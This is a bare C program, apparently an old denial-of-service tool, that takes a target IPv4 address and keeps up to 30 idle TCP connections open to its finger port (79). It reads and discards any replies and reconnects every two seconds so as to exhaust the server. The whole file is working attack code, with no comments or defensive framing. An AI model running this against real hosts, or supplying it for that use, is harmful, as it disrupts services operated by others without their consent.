#include <sys/types.h>
#include <sys/time.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <netinet/in.h>

static struct sockaddr_in sin;

#define CONN 30
int flagopen[CONN];
int fd[CONN];

main(argc,argv)
int argc;
char **argv;
{
  char *x = (char *) &sin.sin_addr;
  int x0;
  int x1;
  int x2;
  int x3;
  int i;
  fd_set rfds;
  int fdmax;
  char ch;
  struct timeval tv;

  if (!argv[1]) exit(1);
  if (sscanf(argv[1],"%d.%d.%d.%d",&x0,&x1,&x2,&x3) < 4) exit(1);
  x = (char *) &sin.sin_addr;
  x[0] = x0; x[1] = x1; x[2] = x2; x[3] = x3;
  x = (char *) &sin.sin_port;
  x[0] = 0; x[1] = 79;
  sin.sin_family = AF_INET;

  for (i = 0;i < CONN;++i) flagopen[i] = 0;

  for (;;) {
    for (i = 0;i < CONN;++i)
      if (!flagopen[i]) {
        fd[i] = socket(AF_INET,SOCK_STREAM,0);
        if (fd[i] == -1) exit(1);
        if (connect(fd[i],(struct sockaddr *) &sin,sizeof sin) == -1)
          close(fd[i]);
        else
          flagopen[i] = 1;
        break;
      }
    for (;;) {
      fdmax = 0;
      FD_ZERO(&rfds);
      for (i = 0;i < CONN;++i)
        if (flagopen[i]) {
          if (fd[i] > fdmax) fdmax = fd[i];
          FD_SET(fd[i],&rfds);
        }
      tv.tv_sec = 0;
      tv.tv_usec = 0;
      if (select(fdmax + 1,&rfds,(fd_set *) 0,(fd_set *) 0,&tv) <= 0)
        break;
      for (i = 0;i < CONN;++i)
        if (flagopen[i])
          if (FD_ISSET(fd[i],&rfds))
            if (read(fd[i],&ch,1) <= 0) {
              close(fd[i]);
              flagopen[i] = 0;
            }
    }
    sleep(2);
  }
}
